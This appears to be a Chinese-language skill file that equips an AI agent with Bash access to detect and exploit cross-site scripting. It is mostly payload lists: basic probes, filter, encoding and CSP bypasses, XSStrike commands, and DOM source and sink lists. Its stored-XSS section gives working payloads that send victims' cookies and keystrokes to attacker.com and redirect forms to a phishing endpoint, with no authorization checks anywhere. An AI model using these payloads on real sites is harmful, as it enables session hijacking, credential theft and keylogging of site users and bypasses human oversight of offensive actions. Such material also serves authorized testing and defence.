---
name: xss
description: 跨站脚本漏洞检测与利用。当目标存在用户输入反射、评论功能、搜索框、URL 参数显示时使用。包括反射型、存储型、DOM XSS。
allowed-tools: Bash, Read, Write
---

# 跨站脚本攻击 (XSS)

通过在网页中注入恶意脚本，在用户浏览器中执行，实现会话劫持、钓鱼攻击或恶意操作。

## 常见指示器

- 用户输入直接反射到页面（搜索框、评论、用户名显示）
- URL 参数直接显示在页面中
- 富文本编辑器或 Markdown 渲染
- 错误信息包含用户输入
- JSON 响应被直接渲染
- SVG/XML 文件上传

## 检测方法

### 1. 基础测试

```bash
# 简单 payload
curl "http://target.com/search?q=<script>alert(1)</script>"

# 事件处理器
curl "http://target.com/search?q=<img src=x onerror=alert(1)>"

# SVG
curl "http://target.com/search?q=<svg onload=alert(1)>"
```

### 2. 上下文检测

```bash
# HTML 上下文
<script>alert(1)</script>

# 属性上下文
" onmouseover="alert(1)

# JavaScript 上下文
';alert(1)//

# URL 上下文
javascript:alert(1)
```

## 攻击向量

### 反射型 XSS

```html
<!-- 基础 payload -->
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- 事件处理器 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<iframe onload=alert(1)>

<!-- 伪协议 -->
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>

<!-- 数据 URI -->
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
```

### 存储型 XSS

```html
<!-- Cookie 窃取 -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>

<!-- 键盘记录 -->
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/?k='+e.key)
}
</script>

<!-- 表单劫持 -->
<script>
document.forms[0].action='http://attacker.com/phish'
</script>
```

### DOM XSS

```javascript
// 常见 sink 点
document.write(location.hash)
element.innerHTML = location.search
eval(location.hash.slice(1))
setTimeout(location.hash.slice(1))
element.src = location.search.split('=')[1]

// 利用 payload
#<script>alert(1)</script>
?default=<script>alert(1)</script>
#';alert(1)//
```

### 属性注入

```html
<!-- 闭合属性 -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" onclick="alert(1)"

<!-- 事件属性 -->
" autofocus onfocus="alert(1)
" onmouseover="alert(1)" x="
' accesskey='x' onclick='alert(1)' x='

<!-- href/src 属性 -->
javascript:alert(1)//
data:text/html,<script>alert(1)</script>
```

### 特殊标签

```html
<!-- SVG -->
<svg><script>alert(1)</script></svg>
<svg onload=alert(1)>
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>

<!-- MathML -->
<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click</maction></math>

<!-- 模板 -->
<template><script>alert(1)</script></template>
<xmp><script>alert(1)</script></xmp>
```

## 绕过技术

### 大小写混合

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SVG ONLOAD=alert(1)>
```

### 编码绕过

```html
<!-- HTML 实体 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>

<!-- Unicode -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- URL 编码 -->
<a href="javascript:%61%6c%65%72%74(1)">click</a>

<!-- 双重编码 -->
%253Cscript%253Ealert(1)%253C/script%253E
```

### 标签变形

```html
<!-- 空格替代 -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<img	src=x	onerror=alert(1)>

<!-- 换行 -->
<img src=x
onerror=alert(1)>

<!-- 注释 -->
<script>al/**/ert(1)</script>

<!-- 不常见标签 -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<keygen onfocus=alert(1) autofocus>
```

### 过滤绕过

```html
<!-- script 被过滤 -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr\x00ipt>alert(1)</script>

<!-- alert 被过滤 -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>[].constructor.constructor('alert(1)')()</script>
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- 括号被过滤 -->
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>

<!-- 引号被过滤 -->
<script>alert(/XSS/.source)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
```

### CSP 绕过

```html
<!-- 利用白名单域名 -->
<script src="https://allowed-cdn.com/angular.js"></script>
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

<!-- base 标签劫持 -->
<base href="http://attacker.com/">

<!-- 利用 nonce 泄露 -->
<script nonce="leaked-nonce">alert(1)</script>

<!-- 利用 unsafe-inline -->
<script>alert(1)</script>

<!-- DNS 预取泄露 -->
<link rel="dns-prefetch" href="//attacker.com">
<link rel="prefetch" href="//attacker.com">
```

## XSS 工具

### XSStrike

```bash
# 基础扫描
python3 xsstrike.py -u "http://target.com/search?q=test"

# POST 请求
python3 xsstrike.py -u "http://target.com/search" --data "q=test"

# 爬虫模式
python3 xsstrike.py -u "http://target.com" --crawl

# 绕过 WAF
python3 xsstrike.py -u "http://target.com/search?q=test" --fuzzer
```

### 手动测试

```bash
# 使用 curl 测试
curl "http://target.com/search?q=<script>alert(1)</script>"

# 检查响应中的反射
curl -s "http://target.com/search?q=UNIQUE_STRING" | grep "UNIQUE_STRING"

# 测试编码
curl "http://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
```

## DOM XSS 检测

### 危险 Source

```javascript
// URL 相关
location
location.href
location.search
location.hash
location.pathname
document.URL
document.documentURI
document.referrer

// 存储相关
localStorage
sessionStorage

// 消息相关
window.name
postMessage
```

### 危险 Sink

```javascript
// 执行代码
eval()
setTimeout()
setInterval()
Function()
execScript()

// HTML 注入
innerHTML
outerHTML
document.write()
document.writeln()

// URL 跳转
location
location.href
location.assign()
location.replace()
window.open()

// 其他
element.src
element.href
jQuery.html()
jQuery.append()
```

## 最佳实践

1. 先用简单 payload 测试: `<script>alert(1)</script>`
2. 如果被过滤，尝试事件处理器: `<img src=x onerror=alert(1)>`
3. 检查 CSP 头，可能需要绕过
4. DOM XSS 需要分析 JavaScript 代码
5. 注意上下文：HTML、属性、JavaScript、URL
6. 使用不同编码绕过过滤
7. 测试不常见标签和事件
8. 检查是否有 WAF，使用绕过技术
